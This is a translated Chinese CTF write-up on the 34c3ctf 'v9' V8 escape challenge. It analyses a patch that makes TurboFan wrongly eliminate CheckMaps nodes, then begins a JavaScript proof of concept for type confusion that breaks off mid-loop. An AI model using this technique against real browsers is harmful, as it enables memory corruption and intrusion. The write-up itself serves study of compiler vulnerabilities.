# 34c3ctf-v9
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
结合Turbolizer来分析34c3ctf-v9的v8逃逸题
## 0x01 patch分析
    diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc
    index 3a40e8d..cb51acc 100644
    --- a/src/compiler/redundancy-elimination.cc
    +++ b/src/compiler/redundancy-elimination.cc
    @@ -5,6 +5,8 @@
     #include "src/compiler/redundancy-elimination.h"
     #include "src/compiler/node-properties.h"
    +#include "src/compiler/simplified-operator.h"
    +#include "src/objects-inl.h"
     namespace v8 {
     namespace internal {
    @@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) {
         case IrOpcode::kCheckHeapObject:
         case IrOpcode::kCheckIf:
         case IrOpcode::kCheckInternalizedString:
    +    case IrOpcode::kCheckMaps:
         case IrOpcode::kCheckNumber:
         case IrOpcode::kCheckReceiver:
         case IrOpcode::kCheckSmi:
    @@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) {
         if (a->opcode() == IrOpcode::kCheckInternalizedString &&
             b->opcode() == IrOpcode::kCheckString) {
           // CheckInternalizedString(node) implies CheckString(node)
    +    } else if (a->opcode() == IrOpcode::kCheckMaps &&
    +               b->opcode() == IrOpcode::kCheckMaps) {
    +      // CheckMaps are compatible if the first checks a subset of the second.
    +      ZoneHandleSet const& a_maps = CheckMapsParametersOf(a->op()).maps();
    +      ZoneHandleSet const& b_maps = CheckMapsParametersOf(b->op()).maps();
    +      if (!b_maps.contains(a_maps)) {
    +        return false;
    +      }
         } else {
           return false;
         }
从patch中可以看到，在`redundancy-elimination.cc`源文件的`RedundancyElimination::Reduce`函数中增加了一句`case
IrOpcode::kCheckMaps:`，这样对于`checkmaps`节点，也会进行`reduce`
      switch (node->opcode()) {
        case IrOpcode::kCheckBounds:
        case IrOpcode::kCheckFloat64Hole:
        case IrOpcode::kCheckHeapObject:
        case IrOpcode::kCheckIf:
        case IrOpcode::kCheckInternalizedString:
        case IrOpcode::kCheckMaps:
        case IrOpcode::kCheckNumber:
        case IrOpcode::kCheckReceiver:
        case IrOpcode::kCheckSmi:
        case IrOpcode::kCheckString:
        case IrOpcode::kCheckSeqString:
        case IrOpcode::kCheckNotTaggedHole:
        case IrOpcode::kCheckedFloat64ToInt32:
        case IrOpcode::kCheckedInt32Add:
        case IrOpcode::kCheckedInt32Sub:
        case IrOpcode::kCheckedInt32Div:
        case IrOpcode::kCheckedInt32Mod:
        case IrOpcode::kCheckedInt32Mul:
        case IrOpcode::kCheckedTaggedToFloat64:
        case IrOpcode::kCheckedTaggedSignedToInt32:
        case IrOpcode::kCheckedTaggedToInt32:
        case IrOpcode::kCheckedUint32ToInt32:
          return ReduceCheckNode(node);
看到`ReduceCheckNode`函数
    Reduction RedundancyElimination::ReduceCheckNode(Node* node) {
      Node* const effect = NodeProperties::GetEffectInput(node);
      EffectPathChecks const* checks = node_checks_.Get(effect);
      // If we do not know anything about the predecessor, do not propagate just yet
      // because we will have to recompute anyway once we compute the predecessor.
      if (checks == nullptr) return NoChange();
      // See if we have another check that dominates us.
      if (Node* check = checks->LookupCheck(node)) {
        ReplaceWithValue(node, check);
        return Replace(check);
      }
      // Learn from this check.
      return UpdateChecks(node, checks->AddCheck(zone(), node));
    }
该函数调用`LookupCheck(node)`获得新值以后，调用`ReplaceWithValue(node, check)`将原节点进行了替换。  
继续看到`LookupCheck(node)`函数，该函数调用了`IsCompatibleCheck`函数，如果函数返回`true`，那么就会返回`check->node`，从而可以对这个节点进行`Reduce`消除
    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) const {
      for (Check const* check = head_; check != nullptr; check = check->next) {
        if (IsCompatibleCheck(check->node, node)) {
          DCHECK(!check->node->IsDead());
          return check->node;
        }
      }
      return nullptr;
    }
而`IsCompatibleCheck`函数则是被patch过的
    bool IsCompatibleCheck(Node const* a, Node const* b) {
      if (a->op() != b->op()) {
        if (a->opcode() == IrOpcode::kCheckInternalizedString &&
            b->opcode() == IrOpcode::kCheckString) {
          // CheckInternalizedString(node) implies CheckString(node)
        } else if (a->opcode() == IrOpcode::kCheckMaps &&
                   b->opcode() == IrOpcode::kCheckMaps) {
          // CheckMaps are compatible if the first checks a subset of the second.
          ZoneHandleSet const& a_maps = CheckMapsParametersOf(a->op()).maps();
          ZoneHandleSet const& b_maps = CheckMapsParametersOf(b->op()).maps();
          if (!b_maps.contains(a_maps)) {
            return false;
          }
        } else {
          return false;
        }
      }
      for (int i = a->op()->ValueInputCount(); --i >= 0;) {
        if (a->InputAt(i) != b->InputAt(i)) return false;
      }
      return true;
    }
在patch的内容分支上，程序获得两个checkmaps值，如果`a_maps`是`b_maps`的子集，那么变直接返回`true`，这将使得节点b被`Reduce`掉
## 0x02 POC构造
首先构造，我们使用了字典对象，我们仅观察checkmaps的reduce过程
    var dict = {a:1.1};
    function opt(obj_dict) {
       var x = obj_dict.a;
       var y = new Array(0x10);
       return obj_dict.a;
    }
    for (var i=0;i1);
    }
    print(opt(dict));
发现没有发生类型混淆，生成IR图进行观察,最后发现
最后发现`return
obj_dict.a;`已经是按照对待`HOLEY_ELEMENTS`类型的方式将值取出的方式。由此，我们考虑加一个函数调用，使得字典对象逃逸，这样由于`return
obj_dict.a;`的checkmaps在`Load eliminated 95`阶段会被移除，而`Escape Analyse`阶段在`Load
eliminated 95`阶段之后，那么就可以造成类型混淆
    var dict = {a:1.1};
    function opt(obj_dict,o) {
       var x = obj_dict.a;
       o(obj_dict);
       return obj_dict.a;
    }
    for (var i=0;i<0x20000;i++) {